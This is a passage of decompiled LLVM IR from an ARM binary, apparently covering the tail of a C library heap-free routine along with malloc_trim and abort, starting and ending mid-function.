  %v4_13210 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 108) to i32*), align 4
  store i32 %v4_13210, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_13210, i32* %r2.global-to-local, align 4
  %v4_1321c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 68) to i32*), align 4
  store i32 %v4_1321c, i32* %r1.global-to-local, align 4
  store i32 %v2_13200, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_13228 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 112) to i32*), align 4
  store i32 %v4_13228, i32* %ip.global-to-local, align 4
  store i32 78388, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13228)
  %v0_13234 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13234, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_1323c = load i32, i32* @r7, align 4
  %v2_1323c = add i32 %v0_1323c, 16
  %v3_1323c = inttoptr i32 %v2_1323c to i32*
  %v4_1323c = load i32, i32* %v3_1323c, align 4
  store i32 %v4_1323c, i32* %ip.global-to-local, align 4
  store i32 78408, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1323c)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_1324c = load i32, i32* @r7, align 4
  %v2_1324c = add i32 %v0_1324c, 64
  %v3_1324c = inttoptr i32 %v2_1324c to i32*
  %v4_1324c = load i32, i32* %v3_1324c, align 4
  store i32 %v4_1324c, i32* @lr, align 4
  %v0_13250 = load i32, i32* @r6, align 4
  %v1_13250 = add i32 %v0_13250, -4
  %v2_13250 = inttoptr i32 %v1_13250 to i32*
  %v3_13250 = load i32, i32* %v2_13250, align 4
  store i32 %v3_13250, i32* %r2.global-to-local, align 4
  %v1_13254 = inttoptr i32 %v4_1324c to i32*
  %v2_13254 = load i32, i32* %v1_13254, align 4
  store i32 %v2_13254, i32* %r3.global-to-local, align 4
  %v1_13258 = and i32 %v3_13250, -4
  store i32 %v1_13258, i32* %ip.global-to-local, align 4
  %v1_1325c = add i32 %v0_13250, -8
  store i32 %v1_1325c, i32* @r5, align 4
  store i32 %v1_1325c, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_13258, %v2_13254
  br i1 %tmp, label %dec_label_pc_1328c, label %dec_label_pc_1326c

dec_label_pc_1326c:                               ; preds = %dec_label_pc_1320c
  %v1_1326c = or i32 %v2_13254, 3
  store i32 %v1_1326c, i32* %r3.global-to-local, align 4
  store i32 %v1_1326c, i32* %v1_13254, align 4
  %v3_13270 = load i32, i32* @lr, align 4
  %v4_13270 = add i32 %v3_13270, -8
  store i32 %v4_13270, i32* %lr.global-to-local, align 4
  %v0_13274 = load i32, i32* %ip.global-to-local, align 4
  %v3_13274 = udiv i32 %v0_13274, 8
  store i32 %v3_13274, i32* %r1.global-to-local, align 4
  %v1_13278 = add i32 %v3_13270, -4
  store i32 %v1_13278, i32* %r2.global-to-local, align 4
  %v4_1327c = mul nuw i32 %v3_13274, 4
  %v5_1327c = add i32 %v4_1327c, %v1_13278
  %v6_1327c = inttoptr i32 %v5_1327c to i32*
  %v7_1327c = load i32, i32* %v6_1327c, align 4
  store i32 %v7_1327c, i32* %r3.global-to-local, align 4
  %v1_13280 = load i32, i32* @r5, align 4
  %v2_13280 = add i32 %v1_13280, 8
  %v3_13280 = inttoptr i32 %v2_13280 to i32*
  store i32 %v7_1327c, i32* %v3_13280, align 4
  %v0_13284 = load i32, i32* @r5, align 4
  %v1_13284 = load i32, i32* %r2.global-to-local, align 4
  %v2_13284 = load i32, i32* %r1.global-to-local, align 4
  %v5_13284 = mul i32 %v2_13284, 4
  %v6_13284 = add i32 %v5_13284, %v1_13284
  %v7_13284 = inttoptr i32 %v6_13284 to i32*
  store i32 %v0_13284, i32* %v7_13284, align 4
  br label %dec_label_pc_133f0

dec_label_pc_1328c:                               ; preds = %dec_label_pc_1320c
  %v1_1328c = and i32 %v3_13250, 2
  %v2_1328c = icmp eq i32 %v1_1328c, 0
  br i1 %v2_1328c, label %dec_label_pc_13294, label %dec_label_pc_133c8

dec_label_pc_13294:                               ; preds = %dec_label_pc_1328c
  %v1_13294 = or i32 %v2_13254, 1
  store i32 %v1_13294, i32* %r3.global-to-local, align 4
  store i32 %v1_13294, i32* %v1_13254, align 4
  %v0_1329c = load i32, i32* @r6, align 4
  %v1_1329c = add i32 %v0_1329c, -4
  %v2_1329c = inttoptr i32 %v1_1329c to i32*
  %v3_1329c = load i32, i32* %v2_1329c, align 4
  store i32 %v3_1329c, i32* %r3.global-to-local, align 4
  %v0_132a0 = load i32, i32* @r5, align 4
  %v1_132a0 = load i32, i32* %ip.global-to-local, align 4
  %v2_132a0 = add i32 %v1_132a0, %v0_132a0
  store i32 %v2_132a0, i32* %lr.global-to-local, align 4
  %v1_132a4 = urem i32 %v3_1329c, 2
  %v2_132a4 = icmp eq i32 %v1_132a4, 0
  %v1_132a8 = add i32 %v2_132a0, 4
  %v2_132a8 = inttoptr i32 %v1_132a8 to i32*
  %v3_132a8 = load i32, i32* %v2_132a8, align 4
  store i32 %v3_132a8, i32* %r8.global-to-local, align 4
  br i1 %v2_132a4, label %dec_label_pc_132b0, label %dec_label_pc_132e4

dec_label_pc_132b0:                               ; preds = %dec_label_pc_13294
  %v1_132b0 = add i32 %v0_1329c, -8
  %v2_132b0 = inttoptr i32 %v1_132b0 to i32*
  %v3_132b0 = load i32, i32* %v2_132b0, align 4
  store i32 %v3_132b0, i32* %r1.global-to-local, align 4
  %v2_132b4 = sub i32 %v0_132a0, %v3_132b0
  store i32 %v2_132b4, i32* %r3.global-to-local, align 4
  %v1_132b8 = add i32 %v2_132b4, 8
  %v2_132b8 = inttoptr i32 %v1_132b8 to i32*
  %v3_132b8 = load i32, i32* %v2_132b8, align 4
  store i32 %v3_132b8, i32* %r2.global-to-local, align 4
  %v1_132bc = add i32 %v3_132b8, 12
  %v2_132bc = inttoptr i32 %v1_132bc to i32*
  %v3_132bc = load i32, i32* %v2_132bc, align 4
  store i32 %v3_132bc, i32* %r4.global-to-local, align 4
  %v9_132c0 = icmp eq i32 %v3_132bc, %v2_132b4
  %v1_132c4 = add i32 %v2_132b4, 12
  %v2_132c4 = inttoptr i32 %v1_132c4 to i32*
  %v3_132c4 = load i32, i32* %v2_132c4, align 4
  store i32 %v3_132c4, i32* %r0.global-to-local, align 4
  br i1 %v9_132c0, label %dec_label_pc_132cc, label %dec_label_pc_13330

dec_label_pc_132cc:                               ; preds = %dec_label_pc_132b0
  %v1_132cc = add i32 %v3_132c4, 8
  %v2_132cc = inttoptr i32 %v1_132cc to i32*
  %v3_132cc = load i32, i32* %v2_132cc, align 4
  store i32 %v3_132cc, i32* %r3.global-to-local, align 4
  %v9_132d0 = icmp eq i32 %v3_132cc, %v2_132b4
  br i1 %v9_132d0, label %dec_label_pc_132d8, label %dec_label_pc_13330

dec_label_pc_132d8:                               ; preds = %dec_label_pc_132cc
  store i32 %v3_132b8, i32* %v2_132cc, align 4
  %v0_132dc = load i32, i32* %r0.global-to-local, align 4
  %v1_132dc = load i32, i32* %r2.global-to-local, align 4
  %v2_132dc = add i32 %v1_132dc, 12
  %v3_132dc = inttoptr i32 %v2_132dc to i32*
  store i32 %v0_132dc, i32* %v3_132dc, align 4
  %v0_132e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_132e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_132e0 = add i32 %v1_132e0, %v0_132e0
  store i32 %v2_132e0, i32* %ip.global-to-local, align 4
  %v0_132f0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_132f4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_132e4

dec_label_pc_132e4:                               ; preds = %dec_label_pc_13294, %dec_label_pc_132d8
  %v0_13370 = phi i32 [ %v1_132a0, %dec_label_pc_13294 ], [ %v2_132e0, %dec_label_pc_132d8 ]
  %v0_132f4 = phi i32 [ %v3_132a8, %dec_label_pc_13294 ], [ %v0_132f4.pre, %dec_label_pc_132d8 ]
  %v1_13308 = phi i32 [ %v2_132a0, %dec_label_pc_13294 ], [ %v0_132f0.pre, %dec_label_pc_132d8 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_132e8 = load i32, i32* @r7, align 4
  %v2_132e8 = add i32 %v0_132e8, 64
  %v3_132e8 = inttoptr i32 %v2_132e8 to i32*
  %v4_132e8 = load i32, i32* %v3_132e8, align 4
  store i32 %v4_132e8, i32* %r2.global-to-local, align 4
  %v1_132ec = add i32 %v4_132e8, 44
  %v2_132ec = inttoptr i32 %v1_132ec to i32*
  %v3_132ec = load i32, i32* %v2_132ec, align 4
  store i32 %v3_132ec, i32* %r3.global-to-local, align 4
  %v9_132f0 = icmp eq i32 %v1_13308, %v3_132ec
  %v1_132f4 = and i32 %v0_132f4, -4
  store i32 %v1_132f4, i32* %r0.global-to-local, align 4
  br i1 %v9_132f0, label %dec_label_pc_13370, label %dec_label_pc_132fc

dec_label_pc_132fc:                               ; preds = %dec_label_pc_132e4
  %v2_132fc = add i32 %v1_13308, %v1_132f4
  store i32 %v2_132fc, i32* %r3.global-to-local, align 4
  %v1_13300 = add i32 %v2_132fc, 4
  %v2_13300 = inttoptr i32 %v1_13300 to i32*
  %v3_13300 = load i32, i32* %v2_13300, align 4
  store i32 %v3_13300, i32* %r3.global-to-local, align 4
  %v1_13304 = urem i32 %v3_13300, 2
  %v2_13304 = icmp eq i32 %v1_13304, 0
  %v2_13308 = add i32 %v1_13308, 4
  %v3_13308 = inttoptr i32 %v2_13308 to i32*
  store i32 %v1_132f4, i32* %v3_13308, align 4
  br i1 %v2_13304, label %dec_label_pc_13310, label %dec_label_pc_132fc.dec_label_pc_13340_crit_edge

dec_label_pc_132fc.dec_label_pc_13340_crit_edge:  ; preds = %dec_label_pc_132fc
  %v0_13350.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13340

dec_label_pc_13310:                               ; preds = %dec_label_pc_132fc
  %v0_13310 = load i32, i32* %lr.global-to-local, align 4
  %v1_13310 = add i32 %v0_13310, 8
  %v2_13310 = inttoptr i32 %v1_13310 to i32*
  %v3_13310 = load i32, i32* %v2_13310, align 4
  store i32 %v3_13310, i32* %r1.global-to-local, align 4
  %v1_13314 = add i32 %v3_13310, 12
  %v2_13314 = inttoptr i32 %v1_13314 to i32*
  %v3_13314 = load i32, i32* %v2_13314, align 4
  store i32 %v3_13314, i32* %r3.global-to-local, align 4
  %v9_13318 = icmp eq i32 %v3_13314, %v0_13310
  %v1_1331c = add i32 %v0_13310, 12
  %v2_1331c = inttoptr i32 %v1_1331c to i32*
  %v3_1331c = load i32, i32* %v2_1331c, align 4
  store i32 %v3_1331c, i32* %r2.global-to-local, align 4
  br i1 %v9_13318, label %dec_label_pc_13324, label %dec_label_pc_13330

dec_label_pc_13324:                               ; preds = %dec_label_pc_13310
  %v1_13324 = add i32 %v3_1331c, 8
  %v2_13324 = inttoptr i32 %v1_13324 to i32*
  %v3_13324 = load i32, i32* %v2_13324, align 4
  store i32 %v3_13324, i32* %r3.global-to-local, align 4
  %v9_13328 = icmp eq i32 %v3_13324, %v0_13310
  br i1 %v9_13328, label %dec_label_pc_13334, label %dec_label_pc_13330

dec_label_pc_13330:                               ; preds = %dec_label_pc_13310, %dec_label_pc_132cc, %dec_label_pc_132b0, %dec_label_pc_13324
  %v0_13330 = call i32 @abort()
  store i32 %v0_13330, i32* %r0.global-to-local, align 4
  %v0_13334.pre = load i32, i32* @r1, align 4
  %v1_13334.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_13334

dec_label_pc_13334:                               ; preds = %dec_label_pc_13324, %dec_label_pc_13330
  %v1_13334 = phi i32 [ %v3_1331c, %dec_label_pc_13324 ], [ %v1_13334.pre, %dec_label_pc_13330 ]
  %v0_13334 = phi i32 [ %v3_13310, %dec_label_pc_13324 ], [ %v0_13334.pre, %dec_label_pc_13330 ]
  %v2_13334 = add i32 %v1_13334, 8
  %v3_13334 = inttoptr i32 %v2_13334 to i32*
  store i32 %v0_13334, i32* %v3_13334, align 4
  %v0_13338 = load i32, i32* %r2.global-to-local, align 4
  %v1_13338 = load i32, i32* %r1.global-to-local, align 4
  %v2_13338 = add i32 %v1_13338, 12
  %v3_13338 = inttoptr i32 %v2_13338 to i32*
  store i32 %v0_13338, i32* %v3_13338, align 4
  %v0_1333c = load i32, i32* %ip.global-to-local, align 4
  %v1_1333c = load i32, i32* %r0.global-to-local, align 4
  %v2_1333c = add i32 %v1_1333c, %v0_1333c
  store i32 %v2_1333c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13340

dec_label_pc_13340:                               ; preds = %dec_label_pc_132fc.dec_label_pc_13340_crit_edge, %dec_label_pc_13334
  %v0_13350 = phi i32 [ %v0_13350.pre, %dec_label_pc_132fc.dec_label_pc_13340_crit_edge ], [ %v2_1333c, %dec_label_pc_13334 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_13344 = load i32, i32* @r7, align 4
  %v2_13344 = add i32 %v0_13344, 64
  %v3_13344 = inttoptr i32 %v2_13344 to i32*
  %v4_13344 = load i32, i32* %v3_13344, align 4
  %v1_13348 = add i32 %v4_13344, 52
  store i32 %v1_13348, i32* %r3.global-to-local, align 4
  %v1_1334c = add i32 %v4_13344, 60
  %v2_1334c = inttoptr i32 %v1_1334c to i32*
  %v3_1334c = load i32, i32* %v2_1334c, align 4
  store i32 %v3_1334c, i32* %r1.global-to-local, align 4
  %v1_13350 = or i32 %v0_13350, 1
  store i32 %v1_13350, i32* %r2.global-to-local, align 4
  %v1_13354 = load i32, i32* %r4.global-to-local, align 4
  %v2_13354 = add i32 %v1_13354, 12
  %v3_13354 = inttoptr i32 %v2_13354 to i32*
  store i32 %v1_13348, i32* %v3_13354, align 4
  %v0_13358 = load i32, i32* %r1.global-to-local, align 4
  %v1_13358 = load i32, i32* %r4.global-to-local, align 4
  %v2_13358 = add i32 %v1_13358, 8
  %v3_13358 = inttoptr i32 %v2_13358 to i32*
  store i32 %v0_13358, i32* %v3_13358, align 4
  %v0_1335c = load i32, i32* %r2.global-to-local, align 4
  %v1_1335c = load i32, i32* %r4.global-to-local, align 4
  %v2_1335c = add i32 %v1_1335c, 4
  %v3_1335c = inttoptr i32 %v2_1335c to i32*
  store i32 %v0_1335c, i32* %v3_1335c, align 4
  %v0_13360 = load i32, i32* %ip.global-to-local, align 4
  %v1_13360 = load i32, i32* %r4.global-to-local, align 4
  %v3_13360 = add i32 %v1_13360, %v0_13360
  %v4_13360 = inttoptr i32 %v3_13360 to i32*
  store i32 %v0_13360, i32* %v4_13360, align 4
  %v0_13364 = load i32, i32* %r4.global-to-local, align 4
  %v1_13364 = load i32, i32* %r1.global-to-local, align 4
  %v2_13364 = add i32 %v1_13364, 12
  %v3_13364 = inttoptr i32 %v2_13364 to i32*
  store i32 %v0_13364, i32* %v3_13364, align 4
  %v0_13368 = load i32, i32* %r4.global-to-local, align 4
  %v1_13368 = load i32, i32* %r3.global-to-local, align 4
  %v2_13368 = add i32 %v1_13368, 8
  %v3_13368 = inttoptr i32 %v2_13368 to i32*
  store i32 %v0_13368, i32* %v3_13368, align 4
  br label %dec_label_pc_13380

dec_label_pc_13370:                               ; preds = %dec_label_pc_132e4
  %v2_13370 = add i32 %v1_132f4, %v0_13370
  store i32 %v2_13370, i32* %ip.global-to-local, align 4
  %v1_13374 = or i32 %v2_13370, 1
  store i32 %v1_13374, i32* %r3.global-to-local, align 4
  %v0_13378 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13378, i32* %v2_132ec, align 4
  %v0_1337c = load i32, i32* %r3.global-to-local, align 4
  %v1_1337c = load i32, i32* %r4.global-to-local, align 4
  %v2_1337c = add i32 %v1_1337c, 4
  %v3_1337c = inttoptr i32 %v2_1337c to i32*
  store i32 %v0_1337c, i32* %v3_1337c, align 4
  br label %dec_label_pc_13380

dec_label_pc_13380:                               ; preds = %dec_label_pc_13340, %dec_label_pc_13370
  %v0_13380 = load i32, i32* %ip.global-to-local, align 4
  %v3_13384 = icmp ult i32 %v0_13380, 131070
  br i1 %v3_13384, label %dec_label_pc_133f0, label %dec_label_pc_13388

dec_label_pc_13388:                               ; preds = %dec_label_pc_13380
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_1338c = load i32, i32* @r7, align 4
  %v2_1338c = add i32 %v0_1338c, 64
  %v3_1338c = inttoptr i32 %v2_1338c to i32*
  %v4_1338c = load i32, i32* %v3_1338c, align 4
  store i32 %v4_1338c, i32* @r4, align 4
  %v1_13390 = inttoptr i32 %v4_1338c to i32*
  %v2_13390 = load i32, i32* %v1_13390, align 4
  store i32 %v2_13390, i32* %r3.global-to-local, align 4
  %v1_13394 = and i32 %v2_13390, 2
  %v2_13394 = icmp eq i32 %v1_13394, 0
  br i1 %v2_13394, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_13388
  store i32 %v4_1338c, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_13388, %bb
  %v1_1339c = xor i1 %v2_13394, true
  call void @__pseudo_cond_branch(i1 %v1_1339c, i32 ptrtoint (i32* @global_var_13040.459 to i32))
  %v0_133a0 = load i32, i32* @r4, align 4
  %v1_133a0 = add i32 %v0_133a0, 44
  %v2_133a0 = inttoptr i32 %v1_133a0 to i32*
  %v3_133a0 = load i32, i32* %v2_133a0, align 4
  store i32 %v3_133a0, i32* %r3.global-to-local, align 4
  %v1_133a4 = add i32 %v3_133a0, 4
  %v2_133a4 = inttoptr i32 %v1_133a4 to i32*
  %v3_133a4 = load i32, i32* %v2_133a4, align 4
  store i32 %v3_133a4, i32* %r3.global-to-local, align 4
  %v1_133a8 = add i32 %v0_133a0, 836
  %v2_133a8 = inttoptr i32 %v1_133a8 to i32*
  %v3_133a8 = load i32, i32* %v2_133a8, align 4
  store i32 %v3_133a8, i32* %r2.global-to-local, align 4
  %v1_133ac = and i32 %v3_133a4, -4
  store i32 %v1_133ac, i32* %r3.global-to-local, align 4
  %v3_133b0 = icmp ult i32 %v1_133ac, %v3_133a8
  br i1 %v3_133b0, label %dec_label_pc_133f0, label %dec_label_pc_133b8

dec_label_pc_133b8:                               ; preds = %bb16
  store i32 %v0_133a0, i32* %r1.global-to-local, align 4
  %v1_133bc = add i32 %v0_133a0, 840
  %v2_133bc = inttoptr i32 %v1_133bc to i32*
  %v3_133bc = load i32, i32* %v2_133bc, align 4
  store i32 %v3_133bc, i32* %r0.global-to-local, align 4
  %v2_133c0 = call i32 @__malloc_trim(i32 %v3_133bc, i32 %v0_133a0)
  store i32 %v2_133c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_133f0

dec_label_pc_133c8:                               ; preds = %dec_label_pc_1328c
  %v2_133c8 = inttoptr i32 %v1_1325c to i32*
  %v3_133c8 = load i32, i32* %v2_133c8, align 4
  store i32 %v3_133c8, i32* %r0.global-to-local, align 4
  %v1_133cc = add i32 %v4_1324c, 848
  %v2_133cc = inttoptr i32 %v1_133cc to i32*
  %v3_133cc = load i32, i32* %v2_133cc, align 4
  store i32 %v3_133cc, i32* %r2.global-to-local, align 4
  %v1_133d0 = add i32 %v4_1324c, 868
  %v2_133d0 = inttoptr i32 %v1_133d0 to i32*
  %v3_133d0 = load i32, i32* %v2_133d0, align 4
  %v2_133d4 = add i32 %v3_133c8, %v1_13258
  store i32 %v2_133d4, i32* %r1.global-to-local, align 4
  %v1_133d8 = add i32 %v3_133cc, -1
  store i32 %v1_133d8, i32* %r2.global-to-local, align 4
  %v2_133dc = sub i32 %v3_133d0, %v2_133d4
  store i32 %v2_133dc, i32* %r3.global-to-local, align 4
  store i32 %v2_133dc, i32* %v2_133d0, align 4
  %v1_133e4 = load i32, i32* @lr, align 4
  %v2_133e4 = add i32 %v1_133e4, 848
  %v3_133e4 = inttoptr i32 %v2_133e4 to i32*
  store i32 %v1_133d8, i32* %v3_133e4, align 4
  %v0_133e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_133e8 = load i32, i32* @r5, align 4
  %v2_133e8 = sub i32 %v1_133e8, %v0_133e8
  store i32 %v2_133e8, i32* %r0.global-to-local, align 4
  %v4_133ec = call i32 @munmap(i32 %v2_133e8, i32 %v2_133d4, i32 %v1_133d8, i32 %v2_133dc)
  store i32 %v4_133ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_133f0

dec_label_pc_133f0:                               ; preds = %bb16, %dec_label_pc_13380, %dec_label_pc_133b8, %dec_label_pc_1326c, %dec_label_pc_133c8
  store i32 %v2_13200, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_133fc = load i32, i32* @r7, align 4
  %v2_133fc = add i32 %v0_133fc, 44
  %v3_133fc = inttoptr i32 %v2_133fc to i32*
  %v4_133fc = load i32, i32* %v3_133fc, align 4
  store i32 %v4_133fc, i32* %ip.global-to-local, align 4
  store i32 78856, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_133fc)
  br label %dec_label_pc_13408

dec_label_pc_13408:                               ; preds = %entry, %dec_label_pc_133f0
  store i32 %v3_131f4, i32* @r4, align 4
  store i32 %v6_131f4, i32* @r5, align 4
  store i32 %v9_131f4, i32* @r6, align 4
  store i32 %v12_131f4, i32* @r7, align 4
  store i32 %v18_131f4, i32* @lr, align 4
  ret i32 %v2_13200

; uselistorder directives
  uselistorder i32 %v0_133a0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_13360, { 1, 0 }
  uselistorder i32 %v1_132a0, { 1, 0 }
  uselistorder i32 %v0_132a0, { 1, 0 }
  uselistorder i32 %v3_13274, { 1, 0 }
  uselistorder i32 %v1_13258, { 1, 0, 2 }
  uselistorder i32 %v2_13254, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1324c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_131fc, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 7, 4, 3, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 68) to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_13408, { 1, 0 }
  uselistorder label %dec_label_pc_133f0, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_13380, { 1, 0 }
  uselistorder label %dec_label_pc_13340, { 1, 0 }
  uselistorder label %dec_label_pc_13334, { 1, 0 }
  uselistorder label %dec_label_pc_13330, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_132e4, { 1, 0 }
}

define i32 @function_13418(i32 %arg1) local_unnamed_addr {
dec_label_pc_13418:
  %v0_13418 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13418, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_13418
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13418, %bb
  %v4_1342c = phi i32 [ %arg1, %dec_label_pc_13418 ], [ 0, %bb ]
  ret i32 %v4_1342c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_13430 = load i32, i32* @r4, align 4
  store i32 %v3_13430, i32* %stack_var_-12, align 4
  %v6_13430 = load i32, i32* @r5, align 4
  %v4_13440 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 64) to i32*), align 4
  store i32 %v4_13440, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_13440, i32* @r0, align 4
  %v0_13450 = call i32 @__malloc_consolidate()
  %v0_13454 = load i32, i32* @r4, align 4
  %v0_13458 = load i32, i32* @r5, align 4
  %v2_13460 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13460, i32* @r4, align 4
  store i32 %v6_13430, i32* @r5, align 4
  %v2_13464 = call i32 @__malloc_trim(i32 %v0_13454, i32 %v0_13458)
  %v0_13468 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13468, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_1346c = phi i32 [ %v2_13464, %entry ], [ 0, %bb ]
  ret i32 %v4_1346c

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r5, align 4
  %v4_13488 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 16) to i32*), align 4
  store i32 78996, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13488)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_134b0 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_134b8 = load i32, i32* @r5, align 4
  %v2_134b8 = add i32 %v0_134b8, 632
  %v3_134b8 = inttoptr i32 %v2_134b8 to i32*
  %v4_134b8 = load i32, i32* %v3_134b8, align 4
  %v2_134bc = icmp eq i32 %v4_134b8, 0
  br i1 %v2_134bc, label %dec_label_pc_134c4, label %dec_label_pc_13504

dec_label_pc_134c4:                               ; preds = %entry
  store i32 1, i32* %v3_134b8, align 4
  br label %dec_label_pc_134cc

dec_label_pc_134cc:                               ; preds = %dec_label_pc_13514, %dec_label_pc_134c4
  %v0_134d0 = load i32, i32* @r5, align 4
  %v2_134d0 = add i32 %v0_134d0, 212
  store i32 %v2_134d0, i32* @r4, align 4
  %v2_134dc = add i32 %v0_134d0, 68
  %v3_134dc = inttoptr i32 %v2_134dc to i32*
  %v4_134dc = load i32, i32* %v3_134dc, align 4
  call void @__pseudo_branch(i32 %v4_134dc)
  %v1_134ec = call i32 @__GI_raise(i32 6)
  %v0_134f8 = load i32, i32* @r5, align 4
  %v2_134f8 = add i32 %v0_134f8, 16
  %v3_134f8 = inttoptr i32 %v2_134f8 to i32*
  %v4_134f8 = load i32, i32* %v3_134f8, align 4
  store i32 79108, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_134f8)
  %v0_13508.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13504

dec_label_pc_13504:                               ; preds = %entry, %dec_label_pc_134cc
  %v1_1351c = phi i32 [ %v0_134b8, %entry ], [ %v0_13508.pre, %dec_label_pc_134cc ]
  %v2_13508 = add i32 %v1_1351c, 632
  %v3_13508 = inttoptr i32 %v2_13508 to i32*
  %v4_13508 = load i32, i32* %v3_13508, align 4
  %v7_1350c = icmp eq i32 %v4_13508, 1
  br i1 %v7_1350c, label %dec_label_pc_13514, label %dec_label_pc_13550

dec_label_pc_13514:                               ; preds = %dec_label_pc_13504
  %v2_13514 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_13514, i32* @r4, align 4
  store i32 2, i32* %v3_13508, align 4
  %v3_1352c = bitcast i32* %stack_var_-28 to i8*
  %v4_1352c = call i32 @__GI_memset(i8* %v3_1352c, i32 0, i32 20)
  %v3_13548 = call i32 @__libc_sigaction(i32 6, i32 %v2_13514, i32 0)
  br label %dec_label_pc_134cc

dec_label_pc_13550:                               ; preds = %dec_label_pc_13504
  %v7_13550 = icmp eq i32 %v4_13508, 2
  br i1 %v7_13550, label %dec_label_pc_13558, label %dec_label_pc_13564

dec_label_pc_13558:                               ; preds = %dec_label_pc_13550
  store i32 3, i32* %v3_13508, align 4
  %v0_13560 = call i32 @abort()
  %v0_13564.pre = load i32, i32* @r5, align 4
  %v1_13564.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_13564

dec_label_pc_13564:                               ; preds = %dec_label_pc_13550, %dec_label_pc_13558
  %v3_13570 = phi i32 [ 632, %dec_label_pc_13550 ], [ %v1_13564.pre, %dec_label_pc_13558 ]
  %v2_13570 = phi i32 [ %v1_1351c, %dec_label_pc_13550 ], [ %v0_13564.pre, %dec_label_pc_13558 ]
  %v2_13564 = add i32 %v2_13570, %v3_13570
  %v3_13564 = inttoptr i32 %v2_13564 to i32*
  %v4_13564 = load i32, i32* %v3_13564, align 4
  %v7_13568 = icmp eq i32 %v4_13564, 3
  br i1 %v7_13568, label %bb, label %.thread2

